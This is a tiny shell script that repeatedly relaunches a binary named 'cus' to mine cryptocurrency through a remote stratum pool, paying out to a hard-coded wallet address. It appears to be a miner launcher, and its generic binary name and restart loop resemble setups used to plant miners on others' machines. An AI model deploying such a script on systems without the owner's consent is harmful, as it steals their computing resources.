#!/bin/sh
#
while [ 1 ]; do
./cus -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RUPQFdwgmved5pimmAfy7k14YpmcGtZRZC.kurawa
sleep 5
done